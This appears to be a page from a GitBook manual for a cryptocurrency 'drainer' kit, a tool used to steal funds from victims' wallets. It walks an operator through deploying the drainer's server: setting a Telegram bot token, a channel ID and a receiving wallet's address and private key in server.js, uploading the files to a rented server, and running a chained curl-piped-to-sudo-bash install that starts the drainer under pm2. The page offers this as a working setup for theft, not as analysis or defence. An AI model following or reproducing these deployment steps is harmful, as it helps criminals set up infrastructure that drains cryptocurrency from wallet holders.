---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 8️⃣ Drainer installation

Contents of the "Drainer" archive\
As soon as you open the archive, you will see two folders in front of you:\
"Client"\
"Server"\
We find the file "server.js" in the "Server" folder carefully read the description of all functions in it\
By default, the most optimal settings.\
The minimum settings that we need to specify in this file for the script to work:

* variable "**MS\_Telegram\_Token**" set the value of the [bot token](creating-bot-and-channel-in-telegram.md)
* variable "**MS\_Telegram\_Chat\_ID**" set the value of the [channel ID](creating-bot-and-channel-in-telegram.md)
* variable "**MS\_Wallet\_Address**" set the value of the address of the [receiving wallet](wallet-setup.md).
* variable "**MS\_Wallet\_Private**" set the value of the private key of the [receiving wallet](wallet-setup.md).



**Save the file and close it.**\
_All other settings (there are a lot of them there) you can look at in the same file and change at your discretion at your own peril and risk._

You need to connect to your [previously purchased](buying-server.md) server through an FTP manager. We recommend using the FileZilla program

You need to create a folder called "server". Note that the folder name must be with a small letter.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Open the "server" folder and transfer all files and folders from the "Server" folder, which was in the archive with the script, into it.

Connect via SSH to our server and log in by login and password.

Now just alternately enter the commands given below, each line is a separate command. Sometimes you can be asked something, for example, \[Y/N], in such cases we enter "Y" and press ENTER. If some windows come out, just press ENTER and do not delve into their essence.

```
sudo apt-get update && sudo apt-get install curl && curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - && sudo apt-get install nodejs && sudo npm i pm2 -g && cd server && sudo npm i && pm2 start server.js --update-env && pm2 save && pm2 startup
```

After installation, you should get this output in the console

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

If you want to change something in the future, just open FileZilla, make changes and save the file - that's it.

If you make any changes to files that belong to the Server, then be sure to restart the server with the command after making changes:

```
pm2 restart server
```

After that, the server will restart and the changes will be applied.

Now if we navigate to our **technical domain** address we should see the response "Sorry, this page in unavailable". This means that the server with the drainer and the technical domain are working correctly.

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
